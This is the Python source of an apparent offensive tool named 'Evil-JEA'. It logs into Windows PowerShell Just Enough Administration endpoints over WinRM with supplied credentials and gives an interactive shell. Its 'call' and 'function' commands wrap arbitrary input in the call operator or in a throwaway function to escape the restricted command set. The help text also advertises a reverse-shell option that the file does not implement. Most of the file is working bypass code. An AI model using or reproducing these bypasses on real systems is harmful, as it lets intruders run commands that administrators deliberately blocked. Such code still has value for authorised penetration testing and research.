#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
This is the entry point for the command-line interface (CLI) application.

It can be used as a handy facility for running the task from a command line.

.. note::

    To learn more about Click visit the
    `project website <http://click.pocoo.org/5/>`_.  There is also a very
    helpful `tutorial video <https://www.youtube.com/watch?v=kNke39OZ2k0>`_.

    To learn more about running Luigi, visit the Luigi project's
    `Read-The-Docs <http://luigi.readthedocs.io/en/stable/>`_ page.

.. currentmodule:: evil_jea.cli
.. moduleauthor:: Sasha Thomas
"""
import logging
import click
import re
from pypsrp.powershell import PowerShell, RunspacePool
from pypsrp.wsman import WSMan
from pypsrp.client import Client
from pypsrp.shell import Process, SignalCode, WinRS
from pypsrp.wsman import WSMan
from tabulate import tabulate
from .__init__ import __version__

LOGGING_LEVELS = {
    0: logging.NOTSET,
    1: logging.ERROR,
    2: logging.WARN,
    3: logging.INFO,
    4: logging.DEBUG,
}  #: a mapping of `verbose` option counts to logging levels


class Info(object):
    """An information object to pass data between CLI functions."""

    def __init__(self):  # Note: This object must have an empty constructor.
        """Create a new instance."""
        self.verbose: int = 0


# pass_info is a decorator for functions that pass 'Info' objects.
#: pylint: disable=invalid-name
pass_info = click.make_pass_decorator(Info, ensure=True)


# Change the options to below to suit the actual options for your task (or
# tasks).
@click.group()
@click.option("--verbose", "-v", count=True, help="Enable verbose output.")
@pass_info
def cli(info: Info, verbose: int, max_content_width=120):
    '''\b
___________     .__.__                 ____.___________   _____   
\_   _____/__  _|__|  |               |    |\_   _____/  /  _  \  
 |    __)_\  \/ /  |  |    ______     |    | |    __)_  /  /_\  \ 
 |        \\\   /|  |  |__ /_____/ /\__|    | |        \/    |    \\
/_______  / \_/ |__|____/         \________|/_______  /\____|__  /
        \/                                          \/         \/ 
                                                                                                                         
    '''
    # Use the verbosity count to determine the logging level...
    if verbose > 0:
        logging.basicConfig(
            level=LOGGING_LEVELS[verbose]
            if verbose in LOGGING_LEVELS
            else logging.DEBUG
        )
        click.echo(
            click.style(
                f"Verbose logging is enabled. "
                f"(LEVEL={logging.getLogger().getEffectiveLevel()})",
                fg="yellow",
            )
        )
    info.verbose = verbose

help_text = """
JEA Shell Commands:
    help                    Show list of available commands
    info [command]          Show information about a command.
    call [command]          JEA bypass: Attempts to run [command] using call operator 
    function [command]      JEA bypass: Attempts to run [command] inside of a custom function
    rev_shell [ip] [port]   JEA bypass: Attempts to run PowerShell reverse shell inside of custom function
"""

@cli.command()
@click.argument('username')
@click.argument('password')
@click.argument('target')
@click.option('--raw', is_flag=True, help="Pass commands through raw pipe (via add_script). Useful for executing non-cmdlet commands. Default is FALSE.")
def connect(username, password, target, raw):
    """
    Connect to JEA target.
    
    \b
    JEA Shell Commands:
        help        Show list of available commands
        call        JEA bypass: Create new function: xyz
        rev_shell   JEA bypass: Create new powershell reverse shell xyz

    """
    commands = ["help", "call", "run", "function", "info"]

    wsman = WSMan(target, username=username,
              password=password, ssl=False,
              auth="negotiate",cert_validation=False)
    print("[+] Testing connection...")
    test = run_command(wsman, "Get-Command", raw)
    if (test):
        print("[+] Connection succeeded. Available commands:")
        for result in test:
            print(result)
    else:
        print("[-] Something went wrong. Check your credentials or target")

    while True:
        command = input(f"[{target}]: PS> ")
        root_command = command.split()[0]
        if root_command in commands:
            match root_command:
                case "help":
                    print(help_text)
                case "info":
                    info_command = command.split()[1]
                    info(wsman, info_command, raw)
                case "call":
                    new = command.split()[1]
                    for result in call_bypass(wsman, new, raw):
                        print(result)
                case "function":
                    new = command.split()[1]
                    for result in function_bypass(wsman, new, raw):
                        print(result)
                case _:
                    print("JEA shell command not found!")
        
        else:
            result = run_command(wsman, command, raw)
            for output in result:
                print(output)


@cli.command()
def version():
    """Get the library version."""
    click.echo(click.style(f"{__version__}", bold=True))

def run_command(wsman, command, raw):
    commands = re.findall(r'(?:[^\s"]|"(?:\\.|[^"])*")+', command)
    with RunspacePool(wsman) as pool:
        ps = PowerShell(pool)
        if raw:
            ps.add_script(command)
        else:
            args = []
            params = []
            seen = False
            if len(commands) > 1:
                for cmd in commands[1:]:
                    if cmd.startswith("-"): 
                        params.append(cmd[1:])
                        seen = True
                        continue
                    else:
                        if seen:
                            params.append(cmd)
                            seen = False
                        else:
                            args.append(cmd)
                ps.add_cmdlet(commands[0])
                for arg in args:
                    ps.add_argument(args)
                for values in range(0, len(params), 2):
                    param, value = params[values:values + 2]
                    ps.add_parameter(param, value)
            else: 
                ps.add_cmdlet(command) 
        ps.invoke()
        return ps.output

def call_bypass(wsman, command, raw):
    result = run_command(wsman, "&{ " + command + " }", raw)
    return result

def function_bypass(wsman, command, raw):
    result = run_command(wsman, "function gl {" + command + "}; gl", raw)
    return result

def info(wsman, command, raw):
    result = run_command(wsman, 'Get-Command', raw)
    results = []
    for output in result:
        #print("----------------------")
        results.append([
            output.adapted_properties.get("Name"), 
            output.adapted_properties.get("CommandType"), 
            output.adapted_properties.get("ScriptBlock")])
    print(tabulate(results, headers=['Name', 'Type', 'Definition'], tablefmt="grid", maxcolwidths=[16, 8, None]))
        #print(f"|f{output.adapted_properties.get('Name')}        |")
        #print(output.adapted_properties.get("CommandType"))
        #print(output.adapted_properties.get("ScriptBlock"))
        #print(definitions)
        #if definitions and command in definitions:
        #    print(definitions)
        #for param in output.adapted_properties:
            #if output.adapted_properties.get("Name") == command:
            #print(output.adap)
            #print(output.adapted_properties[param])
            #print(f"{param.get('Name')}")
            #print(f"key: {param}")
            #print("--------")
            #print(f"value: {output.adapted_properties[param]}")
            #print("--------")
    #print("----------------------------------")

